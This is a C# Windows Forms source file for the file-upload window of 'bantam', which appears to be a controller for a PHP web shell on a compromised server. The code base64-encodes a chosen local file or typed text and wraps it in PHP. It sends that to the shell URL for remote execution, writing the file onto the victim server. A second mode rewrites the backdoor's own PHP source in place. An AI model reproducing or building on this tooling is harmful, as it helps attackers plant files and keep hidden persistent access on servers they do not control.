﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class UploadFile : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public string LocalFileLocation { get; set; }

        /// <summary>
        /// //
        /// </summary>
        public string ServerPath { get; set; }

        /// <summary>
        /// 
        /// </summary>
        public string ShellUrl { get; set; }

        /// <summary>
        /// 
        /// </summary>
        public bool EditingSelf { get; set; }

        /// <summary>
        /// Normal Upload file constructor, sets full url to Shell, and Full path of upload directory
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="serverPath"></param>
        public UploadFile(string shellUrl, string serverPath)
        {
            InitializeComponent();

            ShellUrl = shellUrl;
            lblDynPath.Text = ServerPath = serverPath;
        }

        /// <summary>
        /// Constructor for editing bantams self php code
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="serverPath"></param>
        public UploadFile(string shellUrl, string content, bool editingBantamPhpCode)
        {
            InitializeComponent();

            ShellUrl = shellUrl;
            richTextBox1.Text = content;

            btnBrowse.Enabled = false;
            txtBoxFileName.Enabled = false;

            txtBoxFileName.Text = "Editing Bantam";
            lblDynPath.Text = "WARNING - Editing bantam source code, be very careful....";

            EditingSelf = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (var openShellXMLDialog = new OpenFileDialog {
                Filter = "All files (*.*)|*.*|" 
                       + "PHP files (*.php)|*.php|"
                       + "Text files (*.txt)|*.txt|"
                       + "SH files (*.sh)|*.sh|"
                       + "Python files (*.py)|*.py|"
                       + "HTML files (*.html|*.html|"
                       + "C files (*.c|*.c",
                FilterIndex = 1,
                RestoreDirectory = false
            }) {
                if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                    LocalFileLocation = openShellXMLDialog.FileName;

                    List<string> displayableFileExtensions = new List<string> {
                        ".php",
                        ".txt",
                        ".html",
                        ".sh",
                        ".xml",
                        ".c",
                        ".cpp",
                        ".h",
                        ".pl",
                        ".asp",
                        ".aspx",
                        ".py",
                        ".js",
                        ".jsp"
                    };

                    string ext = Path.GetExtension(LocalFileLocation);

                    if (displayableFileExtensions.Contains(ext)) {
                        string text = string.Empty;
                        using (StreamReader sr = new StreamReader(LocalFileLocation)) {
                            text = sr.ReadToEnd();
                        }

                        richTextBox1.Text = text;
                    } else {
                        richTextBox1.Text = "Cannot diplay that files contents...";
                    }
                    btnUpload.Enabled = true;
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpload_Click(object sender, EventArgs e)
        {
            string phpCode = string.Empty;

            btnBrowse.Enabled = false;
            btnUpload.Enabled = false;
            richTextBox1.Enabled = false;
            
            if (EditingSelf) {
               if (!string.IsNullOrEmpty(richTextBox1.Text)) {
                    phpCode = Helper.EncodeBase64ToString(richTextBox1.Text);
                } else {
                    //todo level 3 logging
                    btnUpload.Enabled = true;
                    return;
                }

                phpCode = PhpHelper.WriteFileVar(PhpHelper.phpServerScriptFileName, phpCode);
            } else {
                if (!string.IsNullOrEmpty(LocalFileLocation)) {
                    phpCode = Convert.ToBase64String(File.ReadAllBytes(LocalFileLocation));
                } else if (!string.IsNullOrEmpty(richTextBox1.Text)) {
                    phpCode = Helper.EncodeBase64ToString(richTextBox1.Text);
                } else {
                    //todo level 3 logging
                    btnUpload.Enabled = true;
                    return;
                }

                //todo check file size and validate send mode and max send size..
                //eventually todo chunking
                string remoteFileLocation = ServerPath + "/" + txtBoxFileName.Text;
                phpCode = PhpHelper.WriteFile(remoteFileLocation, phpCode);
            }

            await WebHelper.ExecuteRemotePHP(ShellUrl, phpCode);

            GC.Collect();
            this.Close();

            btnUpload.Enabled = true;
            btnBrowse.Enabled = true;
            richTextBox1.Enabled = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(richTextBox1.Text)) {
                btnUpload.Enabled = false;
            } else {
                btnUpload.Enabled = true;
            }
        }

        private void UploadFile_Load(object sender, EventArgs e)
        {

        }
    }
}
